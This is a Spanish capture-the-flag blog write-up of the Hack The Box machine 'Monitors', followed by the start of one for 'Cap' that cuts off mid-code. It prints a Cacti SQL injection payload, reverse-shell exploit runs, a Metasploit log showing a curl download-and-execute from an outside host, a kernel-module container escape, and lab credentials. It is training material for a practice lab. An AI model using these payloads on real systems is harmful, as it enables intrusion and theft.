/etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf ServerAdmin admin@monitors.htb ServerName cacti-admin.monitors.htb DocumentRoot /usr/share/cacti ServerAlias cacti-admin.monitors.htb En el subdmominio encontramos Cacti en su version 1.2.12, donde logramos logearnos con usuario y contraseña que encontramos en Wordpress.\n1 admin:BestAdministrator@2020! SQLi as Admin Verificamos vulnerabilidades en cacti, vemos un Issue en github donde se menciona que existe una vulnerabilidad de SQL Injection, además se menciona que esta vulnerabilidad conduce hacia un RCE. Tras reproducir la explotacion SQLi nos devuelve las credenciales de los usuarios.\n1 2 3 4 5 # /cacti/color.php?action=export\u0026amp;header=false\u0026amp;filter=\u0026#39;)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;-- -` \u0026#34;name\u0026#34;,\u0026#34;hex\u0026#34; \u0026#34;Red\u0026#34;,\u0026#34;FF0000\u0026#34; \u0026#34;admin\u0026#34;,\u0026#34;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK\u0026#34; \u0026#34;guest\u0026#34;,\u0026#34;43e9a4ab75570f5b\u0026#34; Realizamos la explotacion del RCE utilizando un exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/monitors/tmp ❯ python3 cacti.py -t http://cacti-admin.monitors.htb -u admin -p \u0026#39;BestAdministrator@2020!\u0026#39; --lhost 10.10.14.25 --lport 1338 [+] Connecting to the server... [+] Retrieving CSRF token... [+] Got CSRF token: sid:55c634ed46657491251ea0f5266c69bd85ca50ad,1622760962 [+] Trying to log in... [+] Successfully logged in! [+] SQL Injection: \u0026#34;name\u0026#34;,\u0026#34;hex\u0026#34; \u0026#34;\u0026#34;,\u0026#34;\u0026#34; \u0026#34;admin\u0026#34;,\u0026#34;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK\u0026#34; \u0026#34;guest\u0026#34;,\u0026#34;43e9a4ab75570f5b\u0026#34; [+] Check your nc listener! Tras la ejecucion logramos obtener una shell con el usuario www-data.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/monitors ❯ rlwrap nc -lvnp 1338 listening on [any] 1338 ... connect to [10.10.14.25] from (UNKNOWN) [10.10.10.238] 56422 /bin/sh: 0: can\u0026#39;t access tty; job control turned off which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@monitors:/usr/share/cacti/cacti$ whoami www-data www-data@monitors:/usr/share/cacti/cacti$ User - Marcus Realizamos una enumeracion en la carpeta principal del usuario marcus y encontramos la carpeta .backup a la cual no tenemos acceso, realizamos una busqueda ante posibles archivos backup y encontramos el archivo del servicio cacti-backup.service.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 www-data@monitors:/home/marcus$ ls -lah total 40K drwxr-xr-x 5 marcus marcus 4.0K Jan 25 15:39 . drwxr-xr-x 3 root root 4.0K Nov 10 2020 .. d--x--x--x 2 marcus marcus 4.0K Nov 10 2020 .backup lrwxrwxrwx 1 root root 9 Nov 10 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 marcus marcus 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 marcus marcus 3.7K Apr 4 2018 .bashrc drwx------ 2 marcus marcus 4.0K Jan 25 15:39 .cache drwx------ 3 marcus marcus 4.0K Nov 10 2020 .gnupg -rw-r--r-- 1 marcus marcus 807 Apr 4 2018 .profile -r--r----- 1 root marcus 84 Jan 25 14:59 note.txt -r--r----- 1 root marcus 33 Jun 2 22:22 user.txt www-data@monitors:/home/marcus$ ls -lah .backup ls: cannot open directory \u0026#39;.backup\u0026#39;: Permission denied www-data@monitors:/home/marcus$ find / -iname *backup* 2\u0026gt;/dev/null [... split ...] /home/marcus/.backup /etc/systemd/system/cacti-backup.service /srv/gitlab/data/backups /lib/modules/4.15.0-142-generic/kernel/drivers/net/team/team_mode_activebackup.ko /lib/modules/4.15.0-142-generic/kernel/drivers/power/supply/wm831x_backup.ko /lib/modules/4.15.0-132-generic/kernel/drivers/net/team/team_mode_activebackup.ko /lib/modules/4.15.0-132-generic/kernel/drivers/power/supply/wm831x_backup.ko /lib/modules/4.15.0-123-generic/kernel/drivers/net/team/team_mode_activebackup.ko /lib/modules/4.15.0-123-generic/kernel/drivers/power/supply/wm831x_backup.ko /lib/systemd/system/cacti-backup.service /var/backups [... split ...] www-data@monitors:/home/marcus$ Vemos que este servicios ejecuta el archivo backup.sh que se encuentra en la carpeta .backup, dentro de este encontramos una contraseña que fue utilizada para copiar archivos por SSH utilizando SCP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 www-data@monitors:/home/marcus$ cat /etc/systemd/system/cacti-backup.service [Unit] Description=Cacti Backup Service After=network.target [Service] Type=oneshot User=www-data ExecStart=/home/marcus/.backup/backup.sh [Install] WantedBy=multi-user.target www-data@monitors:/home/marcus$ ls -lah /home/marcus/.backup/backup.sh -r-xr-x--- 1 www-data www-data 259 Nov 10 2020 /home/marcus/.backup/backup.sh www-data@monitors:/home/marcus$ cat /home/marcus/.backup/backup.sh #!/bin/bash backup_name=\u0026#34;cacti_backup\u0026#34; config_pass=\u0026#34;VerticalEdge2020\u0026#34; zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/* sshpass -p \u0026#34;${config_pass}\u0026#34; scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip rm /tmp/${backup_name}.zip www-data@monitors:/home/marcus$ Utilizamos esta contraseña con el usuario marcus, obtuvimos una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 www-data@monitors:/home/marcus$ su marcus Password: VerticalEdge2020 marcus@monitors:~$ whoami marcus marcus@monitors:~$ ls note.txt user.txt marcus@monitors:~$ cat user.txt ea1f33ecfd0ba29fd294c547628422a3 marcus@monitors:~$ Root - Container Enum Dentro de la carpeta de marcus encontramos una nota, esta indica algo acerca de la imagen de docker, verificamos la version de docker pero no parece ser vulnerable.\n1 2 3 4 5 6 7 8 marcus@monitors:~$ cat note.txt TODO: Disable phpinfo in php.ini - DONE Update docker image for production use - marcus@monitors:~$ docker -v Docker version 20.10.6, build 370c289 marcus@monitors:~$ Tras enumerar archivos yml no encontramos mucha informacion solo una contraseña de lo que parece ser de gitlab.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 marcus@monitors:~$ find / -iname *.yml 2\u0026gt;/dev/null /srv/gitlab/data/gitlab-monitor/gitlab-monitor.yml /usr/share/perl/5.26.1/CPAN/Kwalify/distroprefs.yml /usr/share/cacti/cacti/include/vendor/gettext/tests/assets/po3/Yaml.yml [... split ...] /usr/share/cacti/cacti/include/vendor/gettext/tests/assets/phpcode/YamlDictionary.yml marcus@monitors:~$ cd /srv/gitlab/ marcus@monitors:/srv/gitlab$ ls config data logs marcus@monitors:/srv/gitlab$ ls -lah config total 132K drwxrwxr-x 3 root root 4.0K Nov 11 2020 . drwxr-xr-x 5 root root 4.0K Nov 11 2020 .. -r-xr--r-- 1 root root 78K Nov 11 2020 gitlab.rb -rw------- 1 root root 16K Nov 13 2020 gitlab-secrets.json -rw------- 1 root root 227 Nov 11 2020 ssh_host_ecdsa_key -rw-r--r-- 1 root root 173 Nov 11 2020 ssh_host_ecdsa_key.pub -rw------- 1 root root 399 Nov 11 2020 ssh_host_ed25519_key -rw-r--r-- 1 root root 93 Nov 11 2020 ssh_host_ed25519_key.pub -rw------- 1 root root 1.7K Nov 11 2020 ssh_host_rsa_key -rw-r--r-- 1 root root 393 Nov 11 2020 ssh_host_rsa_key.pub drwxr-xr-x 2 root root 4.0K Nov 11 2020 trusted-certs marcus@monitors:/srv/gitlab$ cat config/gitlab.rb |grep password [... split ...] #### Change the initial default admin password and shared runner registration tokens. gitlab_rails[\u0026#39;initial_root_password\u0026#39;] = \u0026#34;Sup3r_Adm1n15tr4t0r_p455w0rd\u0026#34; # gitlab_rails[\u0026#39;db_password\u0026#39;] = nil [... split ...] marcus@monitors:/srv/gitlab$ Verificamos los puertos, y encontramos el puerto 8443 abierto, además encontramos que el usuario root esta ejecutando docker-proxy en el mismo puerto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 marcus@monitors:/srv/gitlab$ netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - marcus@monitors:/srv/gitlab$ ps -ef |grep docker root 1567 1 0 21:58 ? 00:00:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock root 2069 1567 0 21:58 ? 00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443 root 2083 1310 0 21:58 ? 00:00:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/70bf2796b5f0ec289ff666c0c3d7a3dcc5799a833b3ba51ec9d36b29ddebb379 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc marcus 3082 2908 0 23:12 pts/1 00:00:00 grep --color=auto docker marcus@monitors:/srv/gitlab$ SSH Tunnel Creamos un Tunnel SOCKS5 con SSH y ProxyChains para acceder al puerto 8443.\n1 ssh -D 1337 -q -C -N marcus@10.10.10.238 # VerticalEdge2020 Apache Ofbiz Visitamos la direccion 172.17.0.2:8443, vemos un error y se muestra Apache Tomcat/9.0.31. Ejecutamos feroxbuster y encontramos algunas direcciones.\n1 2 3 4 5 6 7 π ~/htb/monitors ❯ proxychains4 -q feroxbuster -u https://172.17.0.2:8443/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k [... split ...] [#\u0026gt;------------------] - 4m 83147/882180 45m found:48189 errors:16 [###\u0026gt;----------------] - 4m 34978/220545 122/s https://172.17.0.2:8443/ [##\u0026gt;-----------------] - 3m 22354/220545 99/s https://172.17.0.2:8443/ap [#\u0026gt;------------------] - 3m 15451/220545 85/s https://172.17.0.2:8443/ebay [\u0026gt;-------------------] - 2m 10503/220545 75/s https://172.17.0.2:8443/catalog Tras visitar una de estas encontramos un formulario de logeo, además vemos la version de Apache Ofbiz: Release 17.12.01.\nApache Ofbiz Deserialiation Tras realizar una enumeracion de vulnerabilidades, encontramos que es vulnerable a Java deserialization sin autenticacion y, que existen dos \u0026ldquo;versiones\u0026rdquo;: XML-RPC y SOAP.\nUtilizamos metasploit para la version de XML-RPC, configuramos el exploit y agregamos el proxy de proxichains, además otras configuraciones.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # set ReverseAllowProxy true # set AutoCheck false # set ForceExploit true # set payload linux/x64/shell/reverse_tcp msf6 exploit(linux/http/apache_ofbiz_deserialiation) \u0026gt; show options Module options (exploit/linux/http/apache_ofbiz_deserialiation): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies socks4:127.0.0.1:1337 no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 172.17.0.2 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 8443 yes The target port (TCP) SSL true no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes Base path URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (linux/x64/shell/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.25 yes The listen address (an interface may be specified) LPORT 1339 yes The listen port Exploit target: Id Name -- ---- 1 Linux Dropper Tras ejecutar el exploit obtuvimos una shell con usuario root dentro del contenedor.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 msf6 exploit(linux/http/apache_ofbiz_deserialiation) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.25:1339 [!] AutoCheck is disabled, proceeding with exploitation [*] Executing Linux Dropper for linux/x64/shell/reverse_tcp [*] Using URL: http://0.0.0.0:8080/5pqA55D [*] Local IP: http://192.168.1.21:8080/5pqA55D [*] Client 10.10.10.238 (curl/7.64.0) requested /5pqA55D [+] Successfully executed command: sh -c curl${IFS}-so${IFS}/tmp/FNjAZOdV${IFS}http://10.10.14.25:8080/5pqA55D;chmod${IFS}+x${IFS}/tmp/FNjAZOdV;/tmp/FNjAZOdV;rm${IFS}-f${IFS}/tmp/FNjAZOdV [*] Sending payload to 10.10.10.238 (curl/7.64.0) [*] Sending stage (38 bytes) to 10.10.10.238 [*] Command Stager progress - 104.11% done (152/146 bytes) [*] Command shell session 1 opened (10.10.14.25:1339 -\u0026gt; 10.10.10.238:51016) at 2021-06-03 19:18:57 -0400 [*] Server stopped. whoami root which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@70bf2796b5f0:/usr/src/apache-ofbiz-17.12.01# pwd pwd /usr/src/apache-ofbiz-17.12.01 root@70bf2796b5f0:/usr/src/apache-ofbiz-17.12.01# Privesc Docker breakout Enumeramos las capabilities habilitadas del contenedor, y siguiendo la guia de HackTricks encontramos multiples formas para \u0026ldquo;escapar\u0026rdquo; de un contenedor.\n1 2 3 4 5 6 7 8 9 10 11 12 root@70bf2796b5f0:/root# capsh --print capsh --print Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap Securebits: 00/0x0/1\u0026#39;b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked) uid=0(root) gid=0(root) groups= root@70bf2796b5f0:/root# Siguendo la guia de CAP_SYS_MODULE creamos el archivo Makefile y reverse-shell.c modificando la direccion IP a 172.17.0.1 de la maquina, ambos archivos los descargamos dentro del contenedor. Intentamos compilar pero nos mostraba un error de cc1.\n1 2 3 4 5 6 7 8 9 10 11 root@70bf2796b5f0:/root/tmp# make make make -C /lib/modules/4.15.0-142-generic/build M=/root/tmp modules make[1]: Entering directory \u0026#39;/usr/src/linux-headers-4.15.0-142-generic\u0026#39; CC [M] /root/tmp/reverse-shell.o gcc: error trying to exec \u0026#39;cc1\u0026#39;: execvp: No such file or directory make[2]: *** [scripts/Makefile.build:339: /root/tmp/reverse-shell.o] Error 1 make[1]: *** [Makefile:1584: _module_/root/tmp] Error 2 make[1]: Leaving directory \u0026#39;/usr/src/linux-headers-4.15.0-142-generic\u0026#39; make: *** [Makefile:4: all] Error 2 root@70bf2796b5f0:/root/tmp# Buscamos y agregamos dicho directorio del archivo siguiendo una solucion.\n1 2 3 4 root@70bf2796b5f0:/root/tmp# find / -iname cc1 2\u0026gt;/dev/null find / -iname cc1 2\u0026gt;/dev/null /usr/lib/gcc/x86_64-linux-gnu/8/cc1 root@70bf2796b5f0:/root/tmp# export PATH=$PATH/usr/lib/gcc/x86_64-linux-gnu/8/ Tras realizar esto compilamos, ejecutamos netcat en la shell de marcus y ejecutamos la shell inversa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 root@70bf2796b5f0:/root/tmp# make make make -C /lib/modules/4.15.0-142-generic/build M=/root/tmp modules make[1]: Entering directory \u0026#39;/usr/src/linux-headers-4.15.0-142-generic\u0026#39; CC [M] /root/tmp/reverse-shell.o Building modules, stage 2. MODPOST 1 modules CC /root/tmp/reverse-shell.mod.o LD [M] /root/tmp/reverse-shell.ko make[1]: Leaving directory \u0026#39;/usr/src/linux-headers-4.15.0-142-generic\u0026#39; root@70bf2796b5f0:/root/tmp# ls -lah ls -lah total 196K drwxr-xr-x 3 root root 4.0K Jun 4 00:21 . drwx------ 1 root root 4.0K Jun 4 00:20 .. -rw-r--r-- 1 root root 75K Jun 4 00:21 .cache.mk -rw-r--r-- 1 root root 217 Jun 4 00:21 .reverse-shell.ko.cmd -rw-r--r-- 1 root root 30K Jun 4 00:21 .reverse-shell.mod.o.cmd -rw-r--r-- 1 root root 30K Jun 4 00:21 .reverse-shell.o.cmd drwxr-xr-x 2 root root 4.0K Jun 4 00:21 .tmp_versions -rw-r--r-- 1 root root 161 Jun 3 23:54 Makefile -rw-r--r-- 1 root root 0 Jun 4 00:21 Module.symvers -rw-r--r-- 1 root root 34 Jun 4 00:21 modules.order -rw-r--r-- 1 root root 715 Jun 3 23:53 reverse-shell.c -rw-r--r-- 1 root root 5.0K Jun 4 00:21 reverse-shell.ko -rw-r--r-- 1 root root 920 Jun 4 00:21 reverse-shell.mod.c -rw-r--r-- 1 root root 3.0K Jun 4 00:21 reverse-shell.mod.o -rw-r--r-- 1 root root 4.1K Jun 4 00:21 reverse-shell.o root@70bf2796b5f0:/root/tmp# insmod reverse-shell.ko insmod reverse-shell.ko root@70bf2796b5f0:/root/tmp# Con la ejecucion de la shell inversa obtuvimos acceso al usuario root y realizamos la lectura de la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 marcus@monitors:~/tmp$ nc -lvp 5600 Listening on [0.0.0.0] (family 0, port 5600) Connection from monitors 48114 received! bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@monitors:/# whoami whoami root root@monitors:/# ls /root ls /root root.txt root@monitors:/# cd /root cd /root root@monitors:/root# cat root.txt cat root.txt 2bfa1e84ceaa2842c0545ec233af7657 root@monitors:/root# ","description":"Monitors corre WordPress donde descubrimos un plugin vulnerable que nos llevó a Cacti con una version vulnerable donde obtuvimos acceso por una vulnerabilidad SQLi a RCE. Un servicio nos permitio obtener la contraseña de un segundo usuario. Encontramos Apache Ofbiz con una version vulnerable que nos permitio escalar privilegios. Con capabilities del contenedor escapamos de este tras instalar un 'kernel module'.","id":47,"section":"posts","tags":["wordpress","wpscan","cacti","sqli","docker","proxychains","apache ofbiz","java deserialization","docker breakout"],"title":"Hack The Box - Monitors","uri":"https://sckull.github.io/posts/monitors/"},{"content":"\r\u0026ldquo;En Cap encontramos distintas funcionalidades informativas del sistema, una de ellas permite la descarga y analisis de archivos .pcap, luego del analisis de un archivo encontramos credenciales que nos dieron acceso por FTP y SSH. Tras enumerar las capabilities del sistema logramos escalar privilegios por medio de Python.\nNombre Cap OS Linux Puntos 20 Dificultad Facil IP 10.10.10.245 Maker InfoSecJack\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.6, 3.5, 3.9, 6.1, 6.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[2, 2, 7, 3, 8],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: ftp (21), ssh (22), http (80).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 Nmap scan report for 10.10.10.245 (10.10.10.245) Host is up (0.066s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Sat, 05 Jun 2021 19:32:49 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 05 Jun 2021 19:32:43 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Security Dashboard\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/images/icon/favicon.ico\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/themify-icons.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/metisMenu.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/slicknav.min.css\u0026#34;\u0026gt; | \u0026lt;!-- amchar | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 05 Jun 2021 19:32:43 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, OPTIONS, GET | Content-Length: 0 | RTSPRequest: | HTTP/1.1 400 Bad Request | Connection: close | Content-Type: text/html | Content-Length: 196 | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Bad Request\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt; | Invalid HTTP Version \u0026amp;#x27;Invalid HTTP Version: \u0026amp;#x27;RTSP/1.0\u0026amp;#x27;\u0026amp;#x27; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-server-header: gunicorn |_http-title: Security Dashboard Web Site Encontramos una pagina en el puerto 80 en donde se muestra un posible nombre de usuario nathan.\nAdemás se muestran distintas opciones.\nSecurity Snapshot (5 Second PCAP + Analysis): el numero de paquetes de un archivo pcap capturados en 5 segundos, permite descargar del archivo. IP Config: muestra el resultado de ejecucion de ifconfig. Network Status: muestra los puertos y sockets de la maquina. Directory Bruteforcing Feroxbuster nos mostró las mismas direcciones que se muestran en la pagina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 π ~/htb/cap/www ❯ feroxbuster -u http://10.10.10.245 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.2.1 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.245 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.2.1 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 200 355l 1055w 17454c http://10.10.10.245/ip 302 4l 24w 220c http://10.10.10.245/capture 302 4l 24w 208c http://10.10.10.245/data 200 539l 2846w 38910c http://10.10.10.245/netstat PCAP Passwords Security Snapshot permite analizar y descargar una captura de trafico a traves de un archivo pcap, tras analizar el archivo (1.pcap) encontramos las solicitudes (de feroxbuster) que realizamos a la maquina, aunque no se muestra ningun tipo de servicio y/o puerto visitado recientemente.\nNotamos que el nombre del archivo se incrementa (1.pcap) asi como la direccion (/data/1) al visitar y/o descargar el snapshot de 5 segundos, por lo que verificamos si existia algun snapshot anterior, visitamos /data/0 y encontramos que existe dicho archivo, tras analizarlo encontramos credenciales en el servicio FTP.\n1 nathan:Buck3tH4TF0RM3! User - Nathan Utilizamos las credenciales en el servicio SSH, obtuvimos una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 π ~/htb/cap ❯ ssh nathan@10.10.10.245 The authenticity of host \u0026#39;10.10.10.245 (10.10.10.245)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:8TaASv/TRhdOSeq3woLxOcKrIOtDhrZJVrrE0WbzjSc. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.10.245\u0026#39; (ECDSA) to the list of known hosts. nathan@10.10.10.245\u0026#39;s password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat Jun 5 19:27:25 UTC 2021 System load: 0.03 Usage of /: 34.9% of 8.73GB Memory usage: 21% Swap usage: 0% Processes: 228 Users logged in: 0 IPv4 address for eth0: 10.10.10.245 IPv6 address for eth0: dead:beef::250:56ff:feb9:d439 =\u0026gt; There are 4 zombie processes. Last login: Thu May 27 11:21:27 2021 from 10.10.14.7 nathan@cap:~$ ls user.txt nathan@cap:~$ cat user.txt dd1183750d1f8fc9ba833fbb6dc70da7 PRIVILEGE ESCALATION Vemos en el codigo fuente un comentario que indica que existen algunos problemas de permisos con gunicorn, vemos que se utiliza python por ello, pero notamos que utiliza os.setuid(0), lo que indica que cada vez que realiza un snapshot lo hace con el usuario root.\npython\rpython\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @app.route(\u0026#34;/capture\u0026#34;) @limiter.limit(\u0026#34;10 per minute\u0026#34;) def capture(): get_lock() pcapid = get_appid() increment_appid() release_lock() path = os.path.join(app.root_path, \u0026#34;upload\u0026#34;, str(pcapid) + \u0026#34;.pcap\u0026#34;) ip = request.remote_addr # permissions issues with gunicorn and threads. hacky solution for now. #os.setuid(0) #command = f\u0026#34;timeout 5 tcpdump -w {path} -i any host {ip}\u0026#34; command = f\u0026#34;\u0026#34;\u0026#34;python3 -c \u0026#39;import os; os.setuid(0); os.system(\u0026#34;timeout 5 tcpdump -w {path} -i any host 